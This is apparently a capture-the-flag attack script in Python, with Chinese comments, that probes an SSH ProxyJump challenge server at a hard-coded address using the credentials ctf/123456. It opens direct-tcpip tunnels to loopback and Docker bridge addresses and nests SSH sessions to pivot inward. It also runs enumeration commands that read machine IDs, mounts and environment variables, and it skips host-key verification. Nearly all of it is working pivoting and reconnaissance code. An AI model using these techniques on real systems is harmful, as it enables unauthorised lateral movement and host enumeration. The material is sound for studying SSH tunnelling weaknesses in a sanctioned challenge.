import paramiko
import socket
import time
import sys
import struct

"""
FakeJumpServer 攻击分析

当使用 ssh -J (ProxyJump) 时：
1. 客户端连接到跳板机
2. 客户端请求跳板机建立到目标主机的 direct-tcpip 通道
3. 客户端通过这个通道与目标主机进行 SSH 握手

问题：如果跳板机是恶意的，它可以：
1. 不实际连接到目标，而是自己响应
2. 修改通道中的数据
3. 窃取客户端发送的凭据

这题的思路可能是：
- 我们可以通过某种方式让跳板机相信我们是管理员
- 或者我们可以利用跳板机的某些配置缺陷
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def test_hostkey_same_check():
    """
    测试关键假设：
    当我们通过direct-tcpip连接到localhost:22时，
    我们得到的是跳板机本身的dropbear，还是转发到了外部？
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 直接连接的host key
    direct_key = transport.get_remote_server_key()
    print(f"[*] 直接连接的 host key: {direct_key.get_fingerprint().hex()}")
    
    # 通过通道连接的host key
    for target in ["localhost", "127.0.0.1", "10.0.2.2", "172.17.0.1"]:
        try:
            print(f"\n[*] 测试 {target}:22...")
            channel = transport.open_channel("direct-tcpip", (target, 22), ('127.0.0.1', 0))
            
            # 创建新的SSH transport
            target_transport = paramiko.Transport(channel)
            target_transport.start_client()
            
            target_key = target_transport.get_remote_server_key()
            print(f"    Host key: {target_key.get_fingerprint().hex()}")
            print(f"    Key type: {target_key.get_name()}")
            
            same = target_key.get_fingerprint() == direct_key.get_fingerprint()
            print(f"    与直接连接相同: {same}")
            
            target_transport.close()
        except Exception as e:
            print(f"    错误: {e}")
    
    ssh.close()

def test_authentication_to_self():
    """
    尝试通过通道连接到跳板机自己，然后用相同的凭据认证
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 尝试通过通道连接回跳板机...")
    
    channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
    
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 尝试用相同的凭据认证
    print("[*] 尝试用ctf/123456认证...")
    try:
        target_transport.auth_password(USER, PASSWD)
        print("[+] 认证成功!")
        
        # 打开一个会话
        session = target_transport.open_session()
        session.exec_command("id; hostname; cat /etc/machine-id")
        
        # 读取输出
        data = b""
        while True:
            chunk = session.recv(1024)
            if not chunk:
                break
            data += chunk
        
        print(f"[*] 输出:\n{data.decode()}")
        
    except paramiko.AuthenticationException as e:
        print(f"[-] 认证失败: {e}")
    
    target_transport.close()
    ssh.close()

def test_nested_connection():
    """
    测试嵌套连接：
    外部 -> 跳板机 -> 跳板机(通道) -> ?
    
    如果跳板机允许我们通过通道连接回自己，
    然后再打开一个通道，我们可能可以到达其他地方
    """
    
    ssh1 = paramiko.SSHClient()
    ssh1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh1.connect(HOST, PORT, USER, PASSWD)
    
    transport1 = ssh1.get_transport()
    
    print("[*] 第一层连接完成")
    
    # 打开通道到自己
    channel1 = transport1.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
    
    transport2 = paramiko.Transport(channel1)
    transport2.start_client()
    
    try:
        transport2.auth_password(USER, PASSWD)
        print("[+] 第二层认证成功")
        
        # 在第二层打开通道
        print("[*] 尝试在第二层打开通道到172.17.0.1...")
        
        channel2 = transport2.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
        
        transport3 = paramiko.Transport(channel2)
        transport3.start_client()
        
        key = transport3.get_remote_server_key()
        print(f"[*] 第三层 host key: {key.get_fingerprint().hex()}")
        
        transport3.close()
        
    except Exception as e:
        print(f"[-] 错误: {e}")
    
    transport2.close()
    ssh1.close()

def check_container_rootfs():
    """检查容器rootfs的详细信息"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    def exec_cmd(cmd):
        stdin, stdout, stderr = ssh.exec_command(cmd)
        return stdout.read().decode() + stderr.read().decode()
    
    print("[*] 检查机器ID信息...")
    print(exec_cmd("cat /etc/machine-id"))
    print(exec_cmd("cat /proc/sys/kernel/random/boot_id"))
    
    print("[*] 检查挂载信息...")
    print(exec_cmd("cat /proc/mounts"))
    
    print("[*] 检查容器环境...")
    print(exec_cmd("printenv | grep -i container"))
    
    print("[*] 检查9p挂载...")
    print(exec_cmd("cat /proc/filesystems | grep 9p"))
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] SSH ProxyJump 攻击测试")
    print("="*60)
    
    print("\n[1] 测试host key一致性")
    test_hostkey_same_check()
    
    print("\n[2] 测试通过通道自认证")
    test_authentication_to_self()
    
    print("\n[3] 测试嵌套连接")
    test_nested_connection()
    
    print("\n[4] 检查容器rootfs")
    check_container_rootfs()
